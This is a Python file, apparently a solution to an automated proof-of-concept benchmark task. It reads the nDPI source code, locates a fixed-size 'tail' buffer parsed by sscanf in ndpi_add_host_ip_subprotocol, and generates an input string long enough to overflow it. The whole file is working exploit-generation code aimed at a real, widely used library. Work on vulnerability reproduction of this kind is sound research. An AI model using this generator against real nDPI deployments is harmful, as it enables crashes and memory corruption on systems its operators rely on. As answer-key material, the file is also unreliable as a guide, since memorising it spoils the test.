import os
import re
import tarfile
import tempfile
from typing import List, Tuple, Optional, Dict, Any


def _safe_extract_tar(tar_path: str, dst_dir: str) -> None:
    with tarfile.open(tar_path, "r:*") as tf:
        for m in tf.getmembers():
            name = m.name
            if not name:
                continue
            name = name.replace("\\", "/")
            if name.startswith("/") or name.startswith("../") or "/../" in name:
                continue
            target = os.path.join(dst_dir, name)
            abs_dst = os.path.abspath(dst_dir)
            abs_target = os.path.abspath(target)
            if not (abs_target == abs_dst or abs_target.startswith(abs_dst + os.sep)):
                continue
            tf.extract(m, dst_dir)


def _find_file(root: str, rel_suffix: str) -> Optional[str]:
    rel_suffix = rel_suffix.replace("\\", "/")
    for dirpath, _, filenames in os.walk(root):
        for fn in filenames:
            if fn == os.path.basename(rel_suffix):
                p = os.path.join(dirpath, fn)
                rp = os.path.relpath(p, root).replace("\\", "/")
                if rp.endswith(rel_suffix):
                    return p
    # fallback: first match by basename
    for dirpath, _, filenames in os.walk(root):
        for fn in filenames:
            if fn == os.path.basename(rel_suffix):
                return os.path.join(dirpath, fn)
    return None


def _strip_c_comments(s: str) -> str:
    out = []
    i = 0
    n = len(s)
    in_str = False
    in_chr = False
    while i < n:
        c = s[i]
        if in_str:
            out.append(c)
            if c == "\\" and i + 1 < n:
                out.append(s[i + 1])
                i += 2
                continue
            if c == '"':
                in_str = False
            i += 1
            continue
        if in_chr:
            out.append(c)
            if c == "\\" and i + 1 < n:
                out.append(s[i + 1])
                i += 2
                continue
            if c == "'":
                in_chr = False
            i += 1
            continue

        if c == '"':
            in_str = True
            out.append(c)
            i += 1
            continue
        if c == "'":
            in_chr = True
            out.append(c)
            i += 1
            continue

        if c == "/" and i + 1 < n:
            if s[i + 1] == "/":
                i += 2
                while i < n and s[i] != "\n":
                    i += 1
                continue
            if s[i + 1] == "*":
                i += 2
                while i + 1 < n and not (s[i] == "*" and s[i + 1] == "/"):
                    i += 1
                i += 2
                continue

        out.append(c)
        i += 1
    return "".join(out)


def _extract_c_function(src: str, func_name: str) -> Optional[str]:
    m = re.search(r"\b" + re.escape(func_name) + r"\b", src)
    if not m:
        return None
    start = m.start()
    brace_pos = src.find("{", m.end())
    if brace_pos < 0:
        return None

    i = brace_pos
    n = len(src)
    depth = 0
    in_str = False
    in_chr = False
    in_sl = False
    in_ml = False

    while i < n:
        c = src[i]
        if in_sl:
            if c == "\n":
                in_sl = False
            i += 1
            continue
        if in_ml:
            if c == "*" and i + 1 < n and src[i + 1] == "/":
                in_ml = False
                i += 2
                continue
            i += 1
            continue
        if in_str:
            if c == "\\" and i + 1 < n:
                i += 2
                continue
            if c == '"':
                in_str = False
            i += 1
            continue
        if in_chr:
            if c == "\\" and i + 1 < n:
                i += 2
                continue
            if c == "'":
                in_chr = False
            i += 1
            continue

        if c == "/" and i + 1 < n:
            if src[i + 1] == "/":
                in_sl = True
                i += 2
                continue
            if src[i + 1] == "*":
                in_ml = True
                i += 2
                continue
        if c == '"':
            in_str = True
            i += 1
            continue
        if c == "'":
            in_chr = True
            i += 1
            continue

        if c == "{":
            depth += 1
        elif c == "}":
            depth -= 1
            if depth == 0:
                return src[start : i + 1]
        i += 1
    return None


def _extract_call_exprs(func_body: str, callee_names: List[str]) -> List[str]:
    names_pat = r"(?:%s)" % "|".join(re.escape(x) for x in callee_names)
    results = []
    i = 0
    n = len(func_body)
    in_str = False
    in_chr = False
    in_sl = False
    in_ml = False
    while i < n:
        c = func_body[i]
        if in_sl:
            if c == "\n":
                in_sl = False
            i += 1
            continue
        if in_ml:
            if c == "*" and i + 1 < n and func_body[i + 1] == "/":
                in_ml = False
                i += 2
                continue
            i += 1
            continue
        if in_str:
            if c == "\\" and i + 1 < n:
                i += 2
                continue
            if c == '"':
                in_str = False
            i += 1
            continue
        if in_chr:
            if c == "\\" and i + 1 < n:
                i += 2
                continue
            if c == "'":
                in_chr = False
            i += 1
            continue

        if c == "/" and i + 1 < n:
            if func_body[i + 1] == "/":
                in_sl = True
                i += 2
                continue
            if func_body[i + 1] == "*":
                in_ml = True
                i += 2
                continue
        if c == '"':
            in_str = True
            i += 1
            continue
        if c == "'":
            in_chr = True
            i += 1
            continue

        m = re.match(names_pat + r"\s*\(", func_body[i:])
        if not m:
            i += 1
            continue

        call_start = i
        i += m.end() - 1  # at '('
        # parse until matching ')', then to ';'
        depth = 0
        in_str2 = False
        in_chr2 = False
        in_sl2 = False
        in_ml2 = False
        j = i
        while j < n:
            ch = func_body[j]
            if in_sl2:
                if ch == "\n":
                    in_sl2 = False
                j += 1
                continue
            if in_ml2:
                if ch == "*" and j + 1 < n and func_body[j + 1] == "/":
                    in_ml2 = False
                    j += 2
                    continue
                j += 1
                continue
            if in_str2:
                if ch == "\\" and j + 1 < n:
                    j += 2
                    continue
                if ch == '"':
                    in_str2 = False
                j += 1
                continue
            if in_chr2:
                if ch == "\\" and j + 1 < n:
                    j += 2
                    continue
                if ch == "'":
                    in_chr2 = False
                j += 1
                continue

            if ch == "/" and j + 1 < n:
                if func_body[j + 1] == "/":
                    in_sl2 = True
                    j += 2
                    continue
                if func_body[j + 1] == "*":
                    in_ml2 = True
                    j += 2
                    continue
            if ch == '"':
                in_str2 = True
                j += 1
                continue
            if ch == "'":
                in_chr2 = True
                j += 1
                continue

            if ch == "(":
                depth += 1
            elif ch == ")":
                depth -= 1
                if depth == 0:
                    j += 1
                    break
            j += 1

        # extend to semicolon
        k = j
        while k < n and func_body[k] != ";":
            k += 1
        if k < n and func_body[k] == ";":
            k += 1
        results.append(func_body[call_start:k])
        i = k
    return results


def _split_c_args(arg_str: str) -> List[str]:
    args = []
    cur = []
    i = 0
    n = len(arg_str)
    depth_par = 0
    depth_br = 0
    depth_sq = 0
    in_str = False
    in_chr = False
    in_sl = False
    in_ml = False
    while i < n:
        c = arg_str[i]
        if in_sl:
            if c == "\n":
                in_sl = False
            cur.append(c)
            i += 1
            continue
        if in_ml:
            cur.append(c)
            if c == "*" and i + 1 < n and arg_str[i + 1] == "/":
                cur.append("/")
                i += 2
                in_ml = False
                continue
            i += 1
            continue
        if in_str:
            cur.append(c)
            if c == "\\" and i + 1 < n:
                cur.append(arg_str[i + 1])
                i += 2
                continue
            if c == '"':
                in_str = False
            i += 1
            continue
        if in_chr:
            cur.append(c)
            if c == "\\" and i + 1 < n:
                cur.append(arg_str[i + 1])
                i += 2
                continue
            if c == "'":
                in_chr = False
            i += 1
            continue

        if c == "/" and i + 1 < n:
            if arg_str[i + 1] == "/":
                in_sl = True
                cur.append(c)
                cur.append("/")
                i += 2
                continue
            if arg_str[i + 1] == "*":
                in_ml = True
                cur.append(c)
                cur.append("*")
                i += 2
                continue

        if c == '"':
            in_str = True
            cur.append(c)
            i += 1
            continue
        if c == "'":
            in_chr = True
            cur.append(c)
            i += 1
            continue

        if c == "(":
            depth_par += 1
        elif c == ")":
            depth_par = max(0, depth_par - 1)
        elif c == "{":
            depth_br += 1
        elif c == "}":
            depth_br = max(0, depth_br - 1)
        elif c == "[":
            depth_sq += 1
        elif c == "]":
            depth_sq = max(0, depth_sq - 1)

        if c == "," and depth_par == 0 and depth_br == 0 and depth_sq == 0:
            a = "".join(cur).strip()
            if a:
                args.append(a)
            cur = []
            i += 1
            continue

        cur.append(c)
        i += 1

    last = "".join(cur).strip()
    if last:
        args.append(last)
    return args


def _c_unescape(s: str) -> str:
    out = []
    i = 0
    n = len(s)
    while i < n:
        c = s[i]
        if c != "\\":
            out.append(c)
            i += 1
            continue
        if i + 1 >= n:
            break
        nxt = s[i + 1]
        if nxt in ("\\", '"', "'"):
            out.append(nxt)
            i += 2
        elif nxt == "n":
            out.append("\n")
            i += 2
        elif nxt == "t":
            out.append("\t")
            i += 2
        elif nxt == "r":
            out.append("\r")
            i += 2
        elif nxt == "v":
            out.append("\v")
            i += 2
        elif nxt == "f":
            out.append("\f")
            i += 2
        elif nxt == "a":
            out.append("\a")
            i += 2
        elif nxt == "b":
            out.append("\b")
            i += 2
        elif nxt == "x":
            j = i + 2
            hex_digits = []
            while j < n and len(hex_digits) < 2 and s[j] in "0123456789abcdefABCDEF":
                hex_digits.append(s[j])
                j += 1
            if hex_digits:
                out.append(chr(int("".join(hex_digits), 16)))
                i = j
            else:
                out.append("x")
                i += 2
        elif nxt.isdigit():
            j = i + 1
            oct_digits = []
            while j < n and len(oct_digits) < 3 and s[j] in "01234567":
                oct_digits.append(s[j])
                j += 1
            if oct_digits:
                out.append(chr(int("".join(oct_digits), 8)))
                i = j
            else:
                i += 2
        elif nxt == "\n":
            i += 2
        else:
            out.append(nxt)
            i += 2
    return "".join(out)


def _extract_string_literals(expr: str) -> Optional[str]:
    parts = []
    i = 0
    n = len(expr)
    while i < n:
        if expr[i] != '"':
            i += 1
            continue
        i += 1
        buf = []
        while i < n:
            c = expr[i]
            if c == "\\" and i + 1 < n:
                buf.append(c)
                buf.append(expr[i + 1])
                i += 2
                continue
            if c == '"':
                i += 1
                break
            buf.append(c)
            i += 1
        parts.append(_c_unescape("".join(buf)))
    if not parts:
        return None
    return "".join(parts)


def _find_macro_string(src: str, name: str) -> Optional[str]:
    pat = re.compile(r"^\s*#\s*define\s+" + re.escape(name) + r"\b(.*)$", re.MULTILINE)
    m = pat.search(src)
    if not m:
        # maybe const char *
        m2 = re.search(r"\b" + re.escape(name) + r"\b\s*=\s*([^;]+);", src)
        if not m2:
            return None
        return _extract_string_literals(m2.group(1))
    rest = m.group(1)
    return _extract_string_literals(rest)


def _parse_scanf_format(fmt: str) -> List[Dict[str, Any]]:
    specs = []
    i = 0
    n = len(fmt)
    while i < n:
        c = fmt[i]
        if c != "%":
            i += 1
            continue
        if i + 1 < n and fmt[i + 1] == "%":
            specs.append({"type": "percent"})
            i += 2
            continue
        j = i + 1
        suppress = False
        if j < n and fmt[j] == "*":
            suppress = True
            j += 1
        width = None
        wstart = j
        while j < n and fmt[j].isdigit():
            j += 1
        if j > wstart:
            try:
                width = int(fmt[wstart:j])
            except Exception:
                width = None

        # length modifier
        length = ""
        if j < n and fmt[j] in "hljztL":
            length += fmt[j]
            j += 1
            if length in ("h", "l") and j < n and fmt[j] == length:
                length += fmt[j]
                j += 1

        if j >= n:
            break
        conv = fmt[j]
        j += 1
        scanset = None
        if conv == "[":
            # scanset: read until closing ']'
            # per C, ']' can appear first
            k = j
            if k < n and fmt[k] == "^":
                k += 1
            if k < n and fmt[k] == "]":
                k += 1
            while k < n and fmt[k] != "]":
                k += 1
            if k < n and fmt[k] == "]":
                scanset = fmt[j:k]
                j = k + 1
            else:
                scanset = fmt[j:]
                j = n
        specs.append({"type": "conv", "suppress": suppress, "width": width, "length": length, "conv": conv, "scanset": scanset})
        i = j
    return specs


def _choose_char_for_scanset(scanset: str) -> str:
    if scanset is None:
        return "A"
    invert = False
    s = scanset
    if s.startswith("^"):
        invert = True
        s = s[1:]
    # build set of excluded/included chars based on a limited expansion (ranges)
    def expand_set(t: str) -> set:
        st = set()
        i = 0
        while i < len(t):
            if i + 2 < len(t) and t[i + 1] == "-" and t[i] != "\\" and t[i + 2] != "\\":
                a = ord(t[i])
                b = ord(t[i + 2])
                if a <= b:
                    for code in range(a, b + 1):
                        st.add(chr(code))
                else:
                    for code in range(b, a + 1):
                        st.add(chr(code))
                i += 3
            else:
                st.add(t[i])
                i += 1
        return st

    set_chars = expand_set(s)
    if invert:
        # pick a common safe char not in set
        for ch in "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._:-":
            if ch not in set_chars:
                return ch
        return "A"
    else:
        for ch in "Aa0._:-":
            if ch in set_chars:
                return ch
        if set_chars:
            return next(iter(set_chars))
        return "A"


def _build_input_from_format(fmt: str, tail_conv_arg_index: Optional[int], tail_len: int) -> bytes:
    # tail_conv_arg_index: index among argument-consuming conversions (non-suppressed and not percent)
    # We generate placeholders minimizing other fields.
    out = []
    i = 0
    n = len(fmt)
    arg_idx = 0
    while i < n:
        c = fmt[i]
        if c != "%":
            if c.isspace():
                # scanf whitespace matches any whitespace; emit a single space, avoid duplicates
                if not out or out[-1] != " ":
                    out.append(" ")
            else:
                out.append(c)
            i += 1
            continue
        if i + 1 < n and fmt[i + 1] == "%":
            out.append("%")
            i += 2
            continue

        j = i + 1
        suppress = False
        if j < n and fmt[j] == "*":
            suppress = True
            j += 1
        width = None
        wstart = j
        while j < n and fmt[j].isdigit():
            j += 1
        if j > wstart:
            try:
                width = int(fmt[wstart:j])
            except Exception:
                width = None
        if j < n and fmt[j] in "hljztL":
            j += 1
            if j < n and fmt[j - 1] in ("h", "l") and fmt[j] == fmt[j - 1]:
                j += 1
        if j >= n:
            break
        conv = fmt[j]
        j += 1
        scanset = None
        if conv == "[":
            k = j
            if k < n and fmt[k] == "^":
                k += 1
            if k < n and fmt[k] == "]":
                k += 1
            while k < n and fmt[k] != "]":
                k += 1
            if k < n and fmt[k] == "]":
                scanset = fmt[j:k]
                j = k + 1
            else:
                scanset = fmt[j:]
                j = n

        # choose placeholder
        val = ""
        if conv in "diuoxX":
            val = "0"
        elif conv in "aAeEfFgG":
            val = "0"
        elif conv == "p":
            val = "0"
        elif conv == "c":
            val = "A"
        elif conv == "s":
            if (not suppress) and (tail_conv_arg_index is not None) and (arg_idx == tail_conv_arg_index):
                val = "A" * max(1, tail_len)
            else:
                val = "A"
        elif conv == "[":
            ch = _choose_char_for_scanset(scanset if scanset is not None else "")
            if (not suppress) and (tail_conv_arg_index is not None) and (arg_idx == tail_conv_arg_index):
                val = ch * max(1, tail_len)
            else:
                val = ch
        elif conv == "n":
            val = ""
        else:
            # unknown conversion; provide something minimal
            val = "A"

        # respect width in format if present (not necessary, but keeps size minimal)
        if width is not None and len(val) > width:
            val = val[:width]

        out.append(val)

        # update arg index if this conversion consumes an argument and isn't suppressed and isn't percent
        if conv not in ("%") and (not suppress) and conv != "percent":
            if conv != "%":
                # '%' already handled
                if conv != "percent":
                    if conv != "" and conv != "%":
                        if conv != " ":
                            if conv != "":
                                # scanf: most conversions except '%' take an arg, including 'n'
                                if conv != "%":
                                    arg_idx += 1

        i = j

    s = "".join(out)
    if not s.endswith("\n"):
        s += "\n"
    return s.encode("ascii", "ignore")


def _pick_sscanf_call_and_format(file_src: str, func_body: str) -> Tuple[Optional[str], Optional[str], Optional[int]]:
    # Returns: call_text, fmt, tail_output_arg_position (among outputs, 0-based)
    call_texts = _extract_call_exprs(func_body, ["sscanf", "__isoc99_sscanf"])
    # prefer one containing tail in arguments
    for ct in call_texts:
        if re.search(r"\btail\b", ct):
            # extract args between first '(' and matching ')'
            p = ct.find("(")
            q = ct.rfind(")")
            if p < 0 or q < 0 or q <= p:
                continue
            inner = ct[p + 1 : q]
            args = _split_c_args(inner)
            if len(args) < 2:
                continue
            fmt_expr = args[1]
            fmt = _extract_string_literals(fmt_expr)
            if fmt is None:
                # maybe macro
                name_m = re.match(r"^\s*([A-Za-z_]\w*)\s*$", fmt_expr.strip())
                if name_m:
                    fmt = _find_macro_string(file_src, name_m.group(1))
            if fmt is None:
                fmt = _extract_string_literals(ct)
            # find tail argument index (within full args list)
            tail_arg_i = None
            for i, a in enumerate(args):
                if i < 2:
                    continue
                if re.search(r"\btail\b", a):
                    tail_arg_i = i
                    break
            if tail_arg_i is None:
                continue
            tail_out_pos = tail_arg_i - 2
            return ct, fmt, tail_out_pos

    # fallback: any sscanf in function, if it has tail declare but no tail in call, return first with string fmt
    for ct in call_texts:
        p = ct.find("(")
        q = ct.rfind(")")
        if p < 0 or q < 0 or q <= p:
            continue
        inner = ct[p + 1 : q]
        args = _split_c_args(inner)
        if len(args) < 2:
            continue
        fmt = _extract_string_literals(args[1]) or _extract_string_literals(ct)
        if fmt:
            return ct, fmt, None

    return None, None, None


def _map_tail_output_to_conv_index(fmt: str, tail_out_pos: Optional[int]) -> Optional[int]:
    if tail_out_pos is None:
        return None
    # compute mapping from output arg position to conversion index among argument-consuming conversions
    convs = _parse_scanf_format(fmt)
    out_pos = 0
    for spec in convs:
        if spec.get("type") != "conv":
            continue
        conv = spec.get("conv")
        suppress = spec.get("suppress", False)
        if conv == "%":
            continue
        if suppress:
            continue
        # consumes argument for most conversions including 'n'
        if out_pos == tail_out_pos:
            return out_pos
        out_pos += 1
    # fallback: if not found, just use tail_out_pos as arg index
    return tail_out_pos


class Solution:
    def solve(self, src_path: str) -> bytes:
        root = None
        tmpdir = None
        try:
            if os.path.isdir(src_path):
                root = src_path
            else:
                tmpdir = tempfile.mkdtemp(prefix="poc_ndpi_")
                if tarfile.is_tarfile(src_path):
                    _safe_extract_tar(src_path, tmpdir)
                    root = tmpdir
                else:
                    root = os.path.dirname(os.path.abspath(src_path))

            cpath = _find_file(root, "src/lib/ndpi_main.c")
            if cpath is None:
                # fallback: search any ndpi_main.c
                cpath = _find_file(root, "ndpi_main.c")
            if cpath is None:
                return (b"A" * 64) + b"\n"

            with open(cpath, "rb") as f:
                data = f.read()
            try:
                file_src = data.decode("utf-8", "ignore")
            except Exception:
                file_src = data.decode("latin-1", "ignore")

            func_body = _extract_c_function(file_src, "ndpi_add_host_ip_subprotocol")
            if not func_body:
                # fallback to whole file scan
                func_body = file_src

            func_nocomments = _strip_c_comments(func_body)

            tail_size = None
            m = re.search(r"\bchar\s+tail\s*\[\s*(\d+)\s*\]", func_nocomments)
            if m:
                try:
                    tail_size = int(m.group(1))
                except Exception:
                    tail_size = None
            if tail_size is None or tail_size <= 0 or tail_size > 4096:
                tail_size = 16

            _, fmt, tail_out_pos = _pick_sscanf_call_and_format(file_src, func_body)
            if not fmt:
                # heuristic fallback based on common rule styles
                # try to resemble "host:ip:proto <overflow>"
                base = "a:0.0.0.0:0 "
                tail = "A" * tail_size
                return (base + tail + "\n").encode("ascii")

            tail_conv_arg_index = _map_tail_output_to_conv_index(fmt, tail_out_pos)
            poc = _build_input_from_format(fmt, tail_conv_arg_index, tail_size)
            return poc
        finally:
            # Do not remove tmpdir to allow debugging in some environments; keep minimal side effects.
            pass